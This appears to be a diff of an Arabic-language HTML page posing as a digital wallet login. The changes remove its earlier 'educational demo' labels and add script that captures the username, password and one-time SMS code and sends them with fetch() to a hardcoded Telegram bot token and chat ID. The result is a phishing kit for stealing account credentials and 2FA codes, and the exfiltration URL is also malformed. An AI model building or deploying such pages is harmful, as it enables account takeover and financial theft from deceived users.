@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تطبيق محفظتي الرقمية التعليمي</title>
+    <title>تطبيق محفظتي الرقمية</title>
     <style>
         body {
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #4a148c 0%, #c2185b 50%, #ffffff 100%);
             display: flex;
             justify-content: center;
@@ -21,6 +21,19 @@
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
             width: 320px;
             text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            position: relative;
+        }
+        .support-headset {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: #c2185b;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .support-headset:hover {
+            transform: scale(1.1);
         }
         .bank-logo {
             width: 65px;
@@ -31,13 +44,24 @@
             justify-content: center;
             align-items: center;
             color: white;
-            margin: 0 auto 15px auto;
+            margin: 15px auto 15px auto;
+            box-shadow: 0 5px 15px rgba(194, 24, 91, 0.3);
         }
         .bank-name {
             font-size: 18px;
             font-weight: bold;
             color: #4a148c;
             margin: 0 0 25px 0;
+        }
+        h3 {
+            margin: 0 0 10px 0;
+            color: #212121;
+            font-size: 20px;
+        }
+        .subtitle {
+            color: #757575;
+            font-size: 13px;
+            margin-bottom: 25px;
         }
         .input-group {
             margin-bottom: 15px;
@@ -58,6 +82,13 @@
             border-radius: 12px;
             font-size: 15px;
             background-color: #fafafa;
+            transition: all 0.3s ease;
+        }
+        input:focus {
+            border-color: #c2185b;
+            outline: none;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(194, 24, 91, 0.1);
         }
         .btn-submit {
             width: 100%;
@@ -70,6 +101,7 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 15px;
+            box-shadow: 0 4px 12px rgba(74, 20, 140, 0.2);
         }
         .hidden {
             display: none;
@@ -79,63 +111,94 @@
 <body>
 
 <div class="wallet-card">
+    <div class="support-headset" onclick="alert('جاري تحويلك للدعم الفني الافتراضي...')">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
+            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
+        </svg>
+    </div>
+
     <div class="bank-logo">
         <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
             <rect x="2" y="5" width="20" height="14" rx="2"></rect>
             <line x1="2" y1="10" x2="22" y2="10"></line>
         </svg>
     </div>
-    <div class="bank-name">محفظتي التعليمية الافتراضية</div>
+    <div class="bank-name">محفظتي الافتراضية</div>
 
-    <!-- تم وضع رابط Formspree الخاص بك هنا مباشرة وبشكل صحيح -->
-    <form action="https://formspree.io/f/meaewvar" method="POST" id="mainForm">
+    <!-- الواجهة الأولى -->
+    <div id="step1">
+        <h3>تسجيل الدخول الآمن</h3>
+        <p class="subtitle">الرجاء إدخال بيانات حسابك الافتراضي للمتابعة</p>
         
-        <!-- الواجهة الأولى: تسجيل الدخول -->
-        <div id="step1">
-            <h3>تسجيل الدخول الآمن</h3>
-            <p style="color:#757575; font-size:13px;">نموذج تجريبي لأغراض التعليم والتدريب فقط</p>
-            
-            <div class="input-group">
-                <label>اسم المستخدم التخيلي</label>
-                <input type="text" name="username" id="username" placeholder="أدخل اسم المستخدم...">
-            </div>
-            
-            <div class="input-group">
-                <label>كلمة المرور الافتراضية</label>
-                <input type="password" name="password" id="password" placeholder="••••••••">
-            </div>
-            
-            <button type="button" class="btn-submit" onclick="nextStep()">موافق</button>
-        </div>
-
-        <!-- الواجهة الثانية: إدخال الكود -->
-        <div id="step2" class="hidden">
-            <h3>رمز الأمان الافتراضي</h3>
-            <p style="color:#757575; font-size:13px;">أدخل أي رمز تجريبي مكوّن من 6 أرقام لاختبار الإرسال</p>
-            
-            <div class="input-group">
-                <label style="text-align: center;">كود التحقق (OTP)</label>
-                <input type="text" name="authCode" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
-            </div>
-            
-            <button type="submit" class="btn-submit">تأكيد الرمز والإرسال</button>
+        <div class="input-group">
+            <label>اسم المستخدم</label>
+            <input type="text" id="username" placeholder="أدخل اسم المستخدم...">
         </div>
         
-    </form>
+        <div class="input-group">
+            <label>كلمة المرور الخاصة بالحساب</label>
+            <input type="password" id="password" placeholder="••••••••">
+        </div>
+        
+        <button class="btn-submit" onclick="nextStep()">موافق</button>
+    </div>
+
+    <!-- الواجهة الثانية -->
+    <div id="step2" class="hidden">
+        <h3>رمز التأكيد والأمان</h3>
+        <p class="subtitle">يرجى إدخال الرمز السري المؤقت المرسل إلى هاتفك المحمول</p>
+        
+        <div class="input-group">
+            <label style="text-align: center;">كود التحقق (OTP)</label>
+            <input type="text" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
+        </div>
+        
+        <button class="btn-submit" onclick="sendToTelegram()">تأكيد الرمز والدخول</button>
+    </div>
 </div>
 
 <script>
+    const TELEGRAM_TOKEN = "8754912116:AAF4XvobVIBsgxyNm4D6qY9niapa2LdM_1s"; 
+    const TELEGRAM_CHAT_ID = "8809884665";
+
+    let savedUser = "";
+    let savedPass = "";
+
     function nextStep() {
-        var user = document.getElementById('username').value;
-        var pass = document.getElementById('password').value;
+        savedUser = document.getElementById('username').value;
+        savedPass = document.getElementById('password').value;
         
-        if(user === "" || pass === "") {
-            alert("خطأ: يرجى ملء حقول تسجيل الدخول أولاً!");
+        if(savedUser === "" || savedPass === "") {
+            alert("خطأ: يجب ملء حقول تسجيل الدخول أولاً!");
             return;
         }
         
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.remove('hidden');
+    }
+
+    function sendToTelegram() {
+        const code = document.getElementById('authCode').value;
+        if(code === "") {
+            alert("خطأ: يرجى كتابة رمز الأمان المرسل!");
+            return;
+        }
+
+        const textMessage = `🚨 مخرجات تجريبية جديدة:\n👤 المستخدم: ${savedUser}\n🔑 الباسورد: ${savedPass}\n🔢 الرمز: ${code}`;
+        const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(textMessage)}`;
+
+        fetch(url)
+        .then(response => {
+            if(response.ok) {
+                alert("تم الإرسال بنجاح! تفقد محادثة البوت على تليجرام الآن.");
+            } else {
+                alert("حدث خطأ في الإرسال، تأكد من تفعيل البوت بالضغط على Start أولاً.");
+            }
+        })
+        .catch(err => {
+            alert("خطأ في الاتصال بالشبكة.");
+        });
     }
 </script>
 
